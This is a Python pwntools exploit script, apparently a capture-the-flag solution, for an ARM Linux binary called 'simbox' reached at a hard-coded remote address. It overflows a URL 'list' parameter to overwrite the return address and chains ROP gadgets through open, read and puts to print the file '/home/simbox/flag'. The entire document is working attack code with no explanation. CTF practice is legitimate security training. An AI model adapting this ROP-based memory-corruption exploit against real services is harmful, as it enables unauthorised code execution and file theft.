#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="arm", os="linux")

exe = ELF('simbox')

host, port = "35.243.120.147", "10007"

p = remote(host,port)

system = 0xa0a8
puts = 0x08dcc
open = 0x9c74
read = 0xa1a8
url_string = 0x245a8		# point to url string in memory

gadget0 = 0x000135f0 # pop {r0, pc}
gadget1 = 0x00012e38 # mov r1, r5 ; pop {r4, r5, pc}
gadget2 = 0x00012908 # pop {r1, r2, lr}; mul r3, r2, r0; sub r1, r1, r3; mov pc, lr;
gadget3 = 0x00008c80 # pop {r4, pc};

payload = 'http://www.pipotin.com/?'
for i in range(73):
  payload += 'list=123&'
payload += 'list=79&'           # make pos point to return address

# we now construct our top
payload += 'list='+str(gadget2)+'&'
payload += 'list='+str(gadget2)+'&'
payload += 'list='+str(0)+'&'	# r1
payload += 'list='+str(0)+'&'	# r2
payload += 'list='+str(gadget3)+'&'  # set lr to gadget3 for functions return
payload += 'list='+str(0)+'&' # r4
# set r1 = 0
payload += 'list='+str(gadget1)+'&'
payload += 'list='+str(0)+'&'   # r4
payload += 'list='+str(0)+'&'   # r5
payload += 'list='+str(gadget1)+'&'
payload += 'list='+str(0)+'&'   # r4
payload += 'list='+str(0)+'&'   # r5
# set r0 = string and open
payload += 'list='+str(gadget0)+'&'
payload += 'list='+str(url_string+1024)+'&'
payload += 'list='+str(open)+'&'
payload += 'list='+str(0)+'&' # r4

# set r2 = 1024
payload += 'list='+str(gadget2)+'&'
payload += 'list='+str(0)+'&'   # r1
payload += 'list='+str(1024)+'&'   # r2
payload += 'list='+str(gadget3)+'&'  # set lr to gadget3 for functions return
payload += 'list='+str(0)+'&' # r4
# set r1 = url_string+1100
payload += 'list='+str(gadget1)+'&'
payload += 'list='+str(0)+'&'   # r4
payload += 'list='+str(url_string+1100)+'&'   # r5
payload += 'list='+str(gadget1)+'&'
payload += 'list='+str(0)+'&'   # r4
payload += 'list='+str(url_string+1100)+'&'   # r5
# read
payload += 'list='+str(read)+'&' 
payload += 'list='+str(0)+'&' # r4
#
payload += 'list='+str(gadget0)+'&'
payload += 'list='+str(url_string+1100)+'&'
payload += 'list='+str(puts)+'\x00'

payload = payload.ljust(1024,'A')
print('len of payload = '+str(len(payload)))
print('\npayload\n--------------------------\n'+payload)

payload += '/home/simbox/flag\x00'


p.sendlineafter('url> \n', payload)
p.interactive()

